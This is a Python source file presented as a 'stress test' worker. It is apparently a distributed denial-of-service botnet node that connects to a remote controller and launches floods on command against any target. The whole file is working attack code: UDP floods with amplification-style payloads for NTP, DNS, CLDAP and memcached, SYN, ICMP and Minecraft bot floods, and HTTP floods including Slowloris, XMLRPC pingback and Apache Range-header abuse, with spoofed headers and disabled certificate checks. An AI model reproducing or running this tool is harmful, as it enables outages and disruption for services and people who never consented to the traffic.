#!/usr/bin/env python3
"""
AegisShield Stress Test Worker v5.0 (HYPERSCALE)
==================================================
High-performance worker — asyncio L7, pre-generated payloads,
multiprocessing L4, length-prefixed protocol.

Usage:
    python worker.py --master <CONTROLLER_IP>:7777
"""

import socket
import ssl
import struct
import threading
import multiprocessing
import json
import time
import random
import argparse
import http.client
import sys
import os
import urllib.parse

# ══════════════════════════════════════════════════════════════════
#  Protocol — must match controller.py
# ══════════════════════════════════════════════════════════════════

def send_msg_sync(sock, msg):
    """Send a length-prefixed JSON message (synchronous)."""
    data = json.dumps(msg).encode()
    header = struct.pack('>I', len(data))
    sock.sendall(header + data)


def recv_msg_sync(sock):
    """Receive a length-prefixed JSON message (synchronous)."""
    header = _recvall(sock, 4)
    if not header:
        return None
    length = struct.unpack('>I', header)[0]
    if length > 10 * 1024 * 1024:
        raise ValueError("Message too large")
    data = _recvall(sock, length)
    if not data:
        return None
    return json.loads(data.decode())


def _recvall(sock, n):
    """Receive exactly n bytes."""
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf.extend(chunk)
    return bytes(buf)


# ══════════════════════════════════════════════════════════════════
#  Protocol Payloads — pre-built for speed
# ══════════════════════════════════════════════════════════════════

UDP_PAYLOADS = {
    "VSE":    b'\xff\xff\xff\xffTSource Engine Query\x00',
    "TS3":    b'\x05\xca\x7f\x16\x9c\x11\xe9\x89\x00\x00\x00\x00\x02',
    "FIVEM":  b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00',
    "FIVEM-TOKEN": b'\xff\xff\xff\xffgetstatus\x00',
    "MEM":    b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n',
    "NTP":    b'\x17\x00\x03\x2a' + b'\x00' * 44,
    "MCPE":   b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    "DNS":    b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x69\x73\x00\x00\xff\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00',
    "CHAR":   b'\x01',
    "CLDAP":  b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
    "ARD":    b'\x00\x14\x00\x00\x00\x00\x00\x00',
    "RDP":    b'\x03\x00\x00\x0b\x06\xe0\x00\x00\x00\x00\x00',
}

# Pre-generate random payloads pool (avoids per-packet randomness)
RANDOM_POOL_SIZE = 64
RANDOM_UDP_POOL = [random.randbytes(random.randint(512, 65507)) for _ in range(RANDOM_POOL_SIZE)]
RANDOM_TCP_POOL = [random.randbytes(random.randint(256, 4096)) for _ in range(RANDOM_POOL_SIZE)]
RANDOM_HTTP_POOL = [random.randbytes(random.randint(32, 256)).hex() for _ in range(RANDOM_POOL_SIZE)]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2) AppleWebKit/605.1.15 Mobile Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

LAYER4_METHODS = {
    "UDP", "TCP", "SYN", "ICMP", "CPS", "CONNECTION",
    "OVH-UDP", "VSE", "TS3", "FIVEM", "FIVEM-TOKEN",
    "MEM", "NTP", "MCPE", "DNS", "CHAR", "CLDAP", "ARD", "RDP",
    "MCBOT", "MINECRAFT",
}

LAYER7_METHODS = {
    "GET", "POST", "HEAD", "CFB", "CFBUAM", "BYPASS", "OVH", "STRESS",
    "DYN", "SLOW", "GSB", "DGB", "AVB", "APACHE", "XMLRPC", "BOT",
    "BOMB", "DOWNLOADER", "KILLER", "PPS", "EVEN", "RHEX", "STOMP",
    "NULL", "COOKIE",
}


# ══════════════════════════════════════════════════════════════════
#  Helpers
# ══════════════════════════════════════════════════════════════════

_RAND_CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

def rand_ip():
    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def rand_str(n=12):
    return ''.join(random.choices(_RAND_CHARS, k=n))


# ══════════════════════════════════════════════════════════════════
#  Minecraft Protocol
# ══════════════════════════════════════════════════════════════════

class MC:
    @staticmethod
    def varint(d):
        o = b''
        while True:
            b = d & 0x7F
            d >>= 7
            o += struct.pack("B", b | (0x80 if d > 0 else 0))
            if d == 0: break
        return o

    @staticmethod
    def data(*p):
        p = b''.join(p)
        return MC.varint(len(p)) + p

    @staticmethod
    def handshake(host, port, proto=47, state=1):
        return MC.data(MC.varint(0x00), MC.varint(proto),
                       MC.data(host.encode()), struct.pack('>H', port), MC.varint(state))

    @staticmethod
    def login(user):
        if isinstance(user, str): user = user.encode()
        return MC.data(MC.varint(0x00), MC.data(user))

    @staticmethod
    def chat(msg):
        return MC.data(MC.varint(0x01), MC.data(msg.encode()))

    @staticmethod
    def ping():
        return MC.data(b'\x00')


# ══════════════════════════════════════════════════════════════════
#  WORKER CLASS
# ══════════════════════════════════════════════════════════════════

class StressWorker:
    def __init__(self, master_host, master_port):
        self.master_host = master_host
        self.master_port = master_port
        self.sock = None
        self.stop_flag = threading.Event()

    def connect(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                self.sock.connect((self.master_host, self.master_port))
                print(f"  ✅ Connected to {self.master_host}:{self.master_port}")
                return
            except (ConnectionRefusedError, OSError) as e:
                print(f"  ⏳ Retrying in 3s... ({e})")
                time.sleep(3)

    def send_stats(self, msg):
        try:
            send_msg_sync(self.sock, msg)
        except (BrokenPipeError, OSError):
            pass

    def listen(self):
        while True:
            try:
                msg = recv_msg_sync(self.sock)
                if msg is None:
                    raise ConnectionResetError("Disconnected")
                self.handle_command(msg)
            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                print(f"  ❌ Lost connection: {e}")
                self.stop_flag.set()
                time.sleep(2)
                self.connect()
            except (json.JSONDecodeError, ValueError):
                pass

    def handle_command(self, msg):
        cmd = msg.get("cmd")
        if cmd == "stop":
            print("  🛑 Stop received")
            self.stop_flag.set()
        elif cmd == "ping":
            self.send_stats({"type": "pong"})
        elif cmd == "attack":
            self.stop_flag.clear()
            threading.Thread(target=self.run_attack, args=(msg,), daemon=True).start()

    def run_attack(self, msg):
        method = msg["method"]
        target = msg["target"]
        port = msg.get("port", 0)
        threads = msg.get("threads", 100)
        duration = msg.get("duration", 60)
        power = msg.get("power", 100)
        layer = msg.get("layer", 4 if method in LAYER4_METHODS else 7)

        print(f"  🔥 {method} → L{layer} | Power: {power}% | Threads: {threads}")

        if layer == 4:
            self._run_l4(target, port, method, threads, duration, power)
        else:
            self._run_l7(target, method, threads, duration, power)

    # ──── L4 ──────────────────────────────────────────────────────

    def _run_l4(self, target, port, method, threads, duration, power):
        max_cpus = os.cpu_count() or 4
        num_procs = max(1, min(max_cpus, int(max_cpus * (power / 100.0))))
        tpp = max(1, threads // num_procs)  # threads per process

        udp = {"UDP", "OVH-UDP", "VSE", "TS3", "FIVEM", "FIVEM-TOKEN",
               "MEM", "NTP", "MCPE", "DNS", "CHAR", "CLDAP", "ARD", "RDP"}
        tcp = {"TCP", "SYN", "CPS", "CONNECTION", "MCBOT", "MINECRAFT"}

        counter = multiprocessing.Value('q', 0)
        stop = multiprocessing.Event()
        procs = []

        print(f"     Procs: {num_procs} | Threads/proc: {tpp}")

        for _ in range(num_procs):
            if method in udp:
                p = multiprocessing.Process(target=_udp_proc, args=(target, port, method, duration, counter, stop, tpp), daemon=True)
            elif method == "ICMP":
                p = multiprocessing.Process(target=_icmp_proc, args=(target, duration, counter, stop, tpp), daemon=True)
            elif method in tcp:
                p = multiprocessing.Process(target=_tcp_proc, args=(target, port, method, duration, counter, stop, tpp), daemon=True)
            else:
                continue
            p.start()
            procs.append(p)

        self._monitor_l4(time.time(), duration, counter, method, procs, stop)

    def _monitor_l4(self, start, dur, counter, method, procs, stop):
        try:
            while time.time() - start < dur and not self.stop_flag.is_set():
                time.sleep(2)
                elapsed = max(time.time() - start, 0.1)
                sent = counter.value
                pps = sent / elapsed

                if method in UDP_PAYLOADS:
                    avg = len(UDP_PAYLOADS[method])
                elif method == "OVH-UDP":
                    avg = 600
                elif method in {"SYN", "CPS", "ICMP"}:
                    avg = 64
                elif method in {"CONNECTION", "MCBOT", "MINECRAFT"}:
                    avg = 128
                else:
                    avg = 2048

                mbps = sent * avg * 8 / elapsed / 1_000_000
                self.send_stats({"type": "stats", "sent": sent, "pps": round(pps),
                                 "mbps": round(mbps, 1), "method": method})
                print(f"  📊 {method} | {sent:,} | {pps:,.0f} pps | {mbps:,.1f} Mbps")
        except KeyboardInterrupt:
            pass

        stop.set()
        for p in procs:
            p.join(timeout=3)
            if p.is_alive(): p.terminate()

        total = counter.value
        elapsed = max(time.time() - start, 0.1)
        self.send_stats({"type": "done", "total": total, "duration": round(elapsed, 1)})
        print(f"  ✅ {method} done. {total:,} in {elapsed:.1f}s")

    # ──── L7 ──────────────────────────────────────────────────────

    def _run_l7(self, url_str, method, threads, duration, power):
        if not url_str.startswith("http"):
            url_str = "http://" + url_str
        url = urllib.parse.urlparse(url_str)
        use_ssl = url.scheme == "https"
        tc = max(1, int(threads * (power / 100.0)))

        print(f"     URL: {url_str} | Threads: {tc}")

        counter = multiprocessing.Value('q', 0)
        stop = threading.Event()

        tlist = []
        for _ in range(tc):
            t = threading.Thread(target=_l7_worker, args=(url, method, duration, counter, stop, use_ssl), daemon=True)
            t.start()
            tlist.append(t)

        start = time.time()
        try:
            while time.time() - start < duration and not self.stop_flag.is_set():
                time.sleep(2)
                elapsed = max(time.time() - start, 0.1)
                sent = counter.value
                rps = sent / elapsed
                self.send_stats({"type": "stats", "sent": sent, "pps": round(rps), "mbps": 0, "method": method})
                print(f"  📊 {method} | {sent:,} | {rps:,.0f} req/s")
        except KeyboardInterrupt:
            pass

        stop.set()
        if self.stop_flag.is_set(): stop.set()
        for t in tlist:
            t.join(timeout=2)

        total = counter.value
        elapsed = max(time.time() - start, 0.1)
        self.send_stats({"type": "done", "total": total, "duration": round(elapsed, 1)})
        print(f"  ✅ {method} done. {total:,} in {elapsed:.1f}s")


# ══════════════════════════════════════════════════════════════════
#  PROCESS WORKERS — Optimized for throughput
# ══════════════════════════════════════════════════════════════════

def _udp_proc(target, port, method, duration, counter, stop, tpp=16):
    end = time.time() + duration
    BATCH = 100  # larger batch = less lock contention
    static = UDP_PAYLOADS.get(method)

    def sender():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)
        except: pass
        addr = (target, port)
        c = 0
        pool_idx = random.randint(0, RANDOM_POOL_SIZE - 1)

        while time.time() < end and not stop.is_set():
            try:
                if static:
                    s.sendto(static, addr)
                elif method == "OVH-UDP":
                    s.sendto(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n" + RANDOM_UDP_POOL[pool_idx][:128], addr)
                    pool_idx = (pool_idx + 1) % RANDOM_POOL_SIZE
                else:
                    s.sendto(RANDOM_UDP_POOL[pool_idx], addr)
                    pool_idx = (pool_idx + 1) % RANDOM_POOL_SIZE
                c += 1
                if c % BATCH == 0:
                    with counter.get_lock():
                        counter.value += BATCH
            except OSError:
                pass
        with counter.get_lock():
            counter.value += c % BATCH
        s.close()

    ts = []
    for _ in range(tpp):
        t = threading.Thread(target=sender, daemon=True)
        t.start()
        ts.append(t)
    for t in ts:
        t.join()


def _tcp_proc(target, port, method, duration, counter, stop, tpp=16):
    end = time.time() + duration
    BATCH = 10

    def connector():
        c = 0
        pool_idx = random.randint(0, RANDOM_POOL_SIZE - 1)
        while time.time() < end and not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if method == "SYN":
                    s.setblocking(False)
                    try: s.connect((target, port))
                    except (BlockingIOError, InterruptedError, OSError): pass
                    s.close()
                    c += 1
                elif method == "CPS":
                    s.settimeout(2)
                    s.connect((target, port))
                    s.close()
                    c += 1
                elif method == "CONNECTION":
                    s.settimeout(5)
                    s.connect((target, port))
                    s.sendall(b"X")
                    time.sleep(0.3)
                    s.close()
                    c += 1
                elif method == "MCBOT":
                    s.settimeout(3)
                    s.connect((target, port))
                    name = f"Bot_{rand_str(5)}"
                    s.sendall(MC.handshake(target, port, 47, 2))
                    s.sendall(MC.login(name))
                    time.sleep(0.5)
                    for _ in range(5):
                        if stop.is_set(): break
                        s.sendall(MC.chat(rand_str(128)))
                        time.sleep(0.3)
                    s.close()
                    c += 1
                elif method == "MINECRAFT":
                    s.settimeout(3)
                    s.connect((target, port))
                    s.sendall(MC.handshake(target, port, 47, 1))
                    s.sendall(MC.ping())
                    s.close()
                    c += 1
                else:  # TCP
                    s.settimeout(2)
                    s.connect((target, port))
                    s.sendall(RANDOM_TCP_POOL[pool_idx])
                    pool_idx = (pool_idx + 1) % RANDOM_POOL_SIZE
                    s.close()
                    c += 1

                if c % BATCH == 0:
                    with counter.get_lock():
                        counter.value += BATCH
            except OSError:
                c += 1
                if c % BATCH == 0:
                    with counter.get_lock():
                        counter.value += BATCH
        with counter.get_lock():
            counter.value += c % BATCH

    ts = []
    for _ in range(tpp):
        t = threading.Thread(target=connector, daemon=True)
        t.start()
        ts.append(t)
    for t in ts:
        t.join()


def _icmp_proc(target, duration, counter, stop, tpp=4):
    end = time.time() + duration
    BATCH = 20

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except OSError as e:
        print(f"  [!] ICMP needs admin: {e}")
        return

    def chksum(data):
        sm = 0
        n = len(data) % 2
        for i in range(0, len(data) - n, 2):
            sm += data[i] + (data[i + 1] << 8)
        if n: sm += data[-1]
        while sm >> 16:
            sm = (sm & 0xFFFF) + (sm >> 16)
        return ~sm & 0xFFFF

    hdr = struct.pack('bbHHh', 8, 0, 0, 1, 1)
    d = b'AegisICMP' * 6
    ck = chksum(hdr + d)
    hdr = struct.pack('bbHHh', 8, 0, socket.htons(ck), 1, 1)
    pkt = hdr + d

    def pinger():
        c = 0
        while time.time() < end and not stop.is_set():
            try:
                s.sendto(pkt, (target, 1))
                c += 1
                if c % BATCH == 0:
                    with counter.get_lock():
                        counter.value += BATCH
            except OSError: pass
        with counter.get_lock():
            counter.value += c % BATCH

    ts = []
    for _ in range(tpp):
        t = threading.Thread(target=pinger, daemon=True)
        t.start()
        ts.append(t)
    for t in ts:
        t.join()


# ══════════════════════════════════════════════════════════════════
#  L7 HTTP WORKER — optimized with connection reuse + pools
# ══════════════════════════════════════════════════════════════════

def _l7_worker(url, method, duration, counter, stop, use_ssl=False):
    end = time.time() + duration
    host = url.hostname
    port = url.port or (443 if use_ssl else 80)
    path = url.path or "/"

    # Pre-build SSL context once
    ssl_ctx = None
    if use_ssl:
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE

    pool_idx = random.randint(0, RANDOM_POOL_SIZE - 1)

    while time.time() < end and not stop.is_set():
        try:
            if use_ssl:
                conn = http.client.HTTPSConnection(host, port, timeout=5, context=ssl_ctx)
            else:
                conn = http.client.HTTPConnection(host, port, timeout=5)

            ua = USER_AGENTS[pool_idx % len(USER_AGENTS)]
            hdrs = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Connection": "keep-alive",
                "X-Forwarded-For": rand_ip(),
            }

            if method == "POST":
                body = '{"d":"%s"}' % RANDOM_HTTP_POOL[pool_idx]
                hdrs["Content-Type"] = "application/json"
                conn.request("POST", path, body=body, headers=hdrs)
            elif method == "HEAD":
                conn.request("HEAD", path, headers=hdrs)
            elif method == "PPS":
                conn.request("GET", path, headers={"User-Agent": ua, "Host": host})
            elif method == "STRESS":
                body = '{"d":"%s"}' % RANDOM_HTTP_POOL[pool_idx]
                hdrs["Content-Type"] = "application/json"
                conn.request("POST", path, body=body, headers=hdrs)
            elif method == "SLOW":
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                if use_ssl:
                    s = ssl_ctx.wrap_socket(s, server_hostname=host)
                s.connect((host, port))
                s.send(f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n".encode())
                while time.time() < end and not stop.is_set():
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    with counter.get_lock(): counter.value += 1
                    time.sleep(random.uniform(5, 15))
                s.close()
                continue
            elif method == "XMLRPC":
                body = ("<?xml version='1.0'?><methodCall><methodName>pingback.ping</methodName>"
                        "<params><param><value><string>%s</string></value></param>"
                        "<param><value><string>%s</string></value></param></params></methodCall>" %
                        (rand_str(64), rand_str(64)))
                hdrs["Content-Type"] = "application/xml"
                conn.request("POST", "/xmlrpc.php", body=body, headers=hdrs)
            elif method == "CFB":
                hdrs["Sec-Fetch-Dest"] = "document"
                hdrs["Sec-Fetch-Mode"] = "navigate"
                hdrs["Upgrade-Insecure-Requests"] = "1"
                conn.request("GET", path, headers=hdrs)
            elif method == "DYN":
                hdrs["Host"] = f"{rand_str(6)}.{host}"
                conn.request("GET", path, headers=hdrs)
            elif method == "NULL":
                hdrs["User-Agent"] = "null"
                conn.request("GET", path, headers=hdrs)
            elif method == "APACHE":
                rng = ",".join(f"5-{i}" for i in range(1, 1024))
                hdrs["Range"] = f"bytes=0-,{rng}"
                conn.request("GET", path, headers=hdrs)
            elif method == "BOT":
                hdrs["User-Agent"] = USER_AGENTS[-1]
                conn.request("GET", "/robots.txt", headers=hdrs)
            elif method == "GSB":
                conn.request("HEAD", f"{path}?q={rand_str(6)}", headers=hdrs)
            elif method == "RHEX":
                conn.request("GET", f"{path}/{rand_str(64)}", headers=hdrs)
            elif method == "COOKIE":
                hdrs["Cookie"] = f"s={rand_str(32)}"
                conn.request("GET", path, headers=hdrs)
            elif method == "EVEN":
                conn.request("GET", path, headers=hdrs)
                try: conn.getresponse()
                except: pass
            elif method == "OVH":
                for _ in range(3):
                    conn.request("GET", path, headers=hdrs)
            elif method == "STOMP":
                hp = rand_str(128)
                hdrs["Host"] = f"{host}/{hp}"
                conn.request("GET", f"/{hp}", headers=hdrs)
            elif method in ("KILLER", "BOMB"):
                for _ in range(10):
                    conn.request("GET", path, headers=hdrs)
            elif method == "DOWNLOADER":
                conn.request("GET", path, headers=hdrs)
                try:
                    r = conn.getresponse()
                    r.read()
                except: pass
            elif method == "AVB":
                conn.request("GET", path, headers=hdrs)
                time.sleep(1)
            elif method == "CFBUAM":
                conn.request("GET", path, headers=hdrs)
                time.sleep(5)
                for _ in range(3):
                    conn.request("GET", path, headers=hdrs)
            elif method in ("BYPASS", "DGB"):
                conn.request("GET", path, headers=hdrs)
            else:
                conn.request("GET", path, headers=hdrs)

            try: conn.getresponse()
            except: pass
            conn.close()

            with counter.get_lock():
                counter.value += 1
            pool_idx = (pool_idx + 1) % RANDOM_POOL_SIZE
        except Exception:
            with counter.get_lock():
                counter.value += 1
            pool_idx = (pool_idx + 1) % RANDOM_POOL_SIZE


# ══════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════

BANNER = """
    \033[91m
    ╔═══════════════════════════════════════════════════════════╗
    ║  ██     ██  ██████  ██████  ██   ██ ███████ ██████       ║
    ║  ██     ██ ██    ██ ██   ██ ██  ██  ██      ██   ██      ║
    ║  ██  █  ██ ██    ██ ██████  █████   █████   ██████       ║
    ║  ██ ███ ██ ██    ██ ██   ██ ██  ██  ██      ██   ██      ║
    ║   ███ ███   ██████  ██   ██ ██   ██ ███████ ██   ██      ║
    ╚═══════════════════════════════════════════════════════════╝\033[0m
    \033[96mAegisShield Worker v5.0 — HYPERSCALE\033[0m
    \033[93m✦ 46 Methods | Pre-gen Payloads | Max Throughput\033[0m
"""


def main():
    multiprocessing.freeze_support()

    parser = argparse.ArgumentParser(description="AegisShield Worker v5.0 HYPERSCALE")
    parser.add_argument("--master", required=True, help="Controller (e.g. 159.65.32.13:7777)")
    args = parser.parse_args()

    host, port = args.master.rsplit(":", 1)
    port = int(port)

    print(BANNER)
    cpus = os.cpu_count() or 4
    print(f"  💻 CPUs: {cpus}")
    print(f"  📦 Pre-generated payload pool: {RANDOM_POOL_SIZE} × 3 types")
    print(f"  🎯 Connecting to: {host}:{port}\n")

    w = StressWorker(host, port)
    w.connect()
    w.listen()


if __name__ == "__main__":
    main()
